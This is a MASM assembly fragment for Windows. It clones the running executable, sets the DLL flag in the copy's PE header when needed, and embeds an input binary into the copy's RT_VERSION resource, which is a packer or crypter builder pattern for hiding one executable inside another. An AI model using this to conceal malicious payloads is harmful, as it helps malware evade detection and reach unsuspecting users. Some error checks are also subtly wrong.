;
; Add the input binary to the resource directory
;	Args: <file to modify>,<file to embed>
;	Ret: TRUE on success, FALSE otherwise
;
add_resource proc file_to_add:ptr char , target_file:ptr char 
	local hRes:dword
	local file_size:dword
	local hFile:dword
	local ncount:dword
	local file_buffer:ptr byte	

	; get file to add size
	invoke CreateFileW, file_to_add, GENERIC_READ, 0h, 0h, OPEN_EXISTING, 0h, 0h
	cmp eax, ERROR_FILE_NOT_FOUND
	je @fail
	mov hFile, eax
	invoke GetFileSize, hFile, 0h
	cmp eax, INVALID_FILE_SIZE
	je @fail
	mov file_size, eax
	
	; load the content	
	invoke heap_alloc, eax
	test eax, eax
	jz @fail
	mov file_buffer, eax

	invoke ReadFile, hfile, file_buffer, file_size, addr ncount, 0h
	test eax, eax
	jz @fail	
	
	invoke CloseHandle, hFile

	; update the file
	invoke BeginUpdateResourceA, target_file, 0h
	test eax, eax
	jz @fail
	mov hRes, eax

	invoke UpdateResourceA, hRes, RT_VERSION, VS_VERSION_INFO, 0h, file_buffer, file_size
	test eax, eax
	jz @fail

	invoke EndUpdateResourceA, hRes, 0h
	test eax, eax
	jz @fail

	invoke heap_free, file_buffer
	mov eax, 1

@exit:
	ret

@fail:
	xor eax, eax
	jmp @exit
add_resource endp

;
; Clone the currently executing file
;	Args: <file path>
;	Ret: The name of the cloned file
;
clone_file proc file_to_add:ptr char
	local orig_filename:ptr char
	local build_filename:ptr char
	local file_extension:ptr char
	local hFile:dword
	local file_size:dword
	local file_buffer:dword
	local ncount:dword

	; check if the file to embed is a dll
	mov eax, 064002e00h
	mov edi, file_to_add
	mov ecx, 255h
@find_extension:
	cmp dword ptr [edi], eax
	je @f
	inc edi
	loop @find_extension
	jmp @fail
@@:
	mov eax, 06c006c00h
	add edi, sizeof dword
	cmp dword ptr [edi], eax
	jne @find_extension
	
	test ecx, ecx
	mov edi, 'lld.'
	mov ecx, 'exe.'
	cmovnz ecx, edi
	mov file_extension, ecx

	; alloc memory for original file name
	invoke heap_alloc, 512h
	test eax, eax
	jz @fail
	mov orig_filename, eax

	; alloc memory for the clone file name
	invoke heap_alloc, 512h
	test eax, eax
	jz @fail
	mov build_filename, eax

	; get executable file name (original file name)
	invoke GetModuleFileNameA, 0h, orig_filename, 512h
	test eax, eax
	jz @fail

	; copy file name
	mov ecx, 512h
	mov esi, orig_filename
	mov edi, build_filename
	rep movsb

	; change the extension from '.<EXT>' to '.build.<EXT>' (I suppose it has 3 chars extension)
	invoke string_len, orig_filename
	test eax, eax
	jz @fail
	mov edx, build_filename
	lea edx, dword ptr [edx + eax - 4]
	mov dword ptr [edx], 'liub'
	add edx, 4
	mov byte ptr [edx], 'd'
	inc edx
	mov eax, file_extension
	mov dword ptr [edx], eax

	; copy the file
	invoke CopyFileA, orig_filename, build_filename, 0h
	test eax, eax
	jz @fail

	; clean-up memory
	invoke heap_free, orig_filename	

	; if the file to embed is a DLL I have to change the File Header Characteristics
	cmp file_extension, 'lld.'
	jne @f

	; read the file content
	invoke CreateFileA, build_filename, GENERIC_READ_WRITE, 0h, 0h, OPEN_EXISTING, 0h, 0h
	test eax, eax
	jz @fail
	mov hFile, eax

	invoke GetFileSize, hFile, 0h
	cmp eax, INVALID_FILE_SIZE
	je @fail
	mov file_size, eax ; save value

	invoke heap_alloc, file_size
	test eax, eax
	jz @fail
	mov file_buffer, eax

	invoke ReadFile, hFile, file_buffer, file_size, addr ncount, 0h
	test eax, eax
	jz @fail

	; go to PE
	mov eax, file_buffer
	mov eax, IMAGE_DOS_HEADER.e_lfanew[eax]
	add eax, file_buffer

	; update the Characteristics
	mov cx, word ptr IMAGE_NT_HEADERS32.FileHeader.Characteristics[eax]
	or cx, IMAGE_FILE_DLL
	mov word ptr IMAGE_NT_HEADERS32.FileHeader.Characteristics[eax], cx

	; go to the start of the file
	invoke SetFilePointer, hFile, 0h, 0h, FILE_BEGIN
	cmp eax, INVALID_SET_FILE_POINTER
	je @fail

	; write back the result
	invoke WriteFile, hFile, file_buffer, file_size, addr ncount, 0h
	test eax, eax
	jz @fail

	; close handle to file
	invoke CloseHandle, hFile

	; clean-up memory
	invoke heap_free, file_buffer

@@:
	mov eax, build_filename

@exit:	
	ret

@fail:
	xor eax, eax
	jmp @exit

clone_file endp

;
; Create the artifact containing the input binary in the embedded resource
;	Args: <file path>
;	Ret: TRUE on success. False otherwise
;
create_artifact proc file_to_add:ptr char
	local cloned_filename:ptr char

	; clone my file 
	invoke clone_file, file_to_add
	test eax, eax
	jz @fail
	mov cloned_filename, eax

	; create the file with the embedded resource
	invoke add_resource, file_to_add, eax
	test eax, eax
	jz @fail

	invoke heap_free, cloned_filename
	mov eax, 1

@exit:
	ret

@fail:
	xor eax, eax
	jmp @exit
create_artifact endp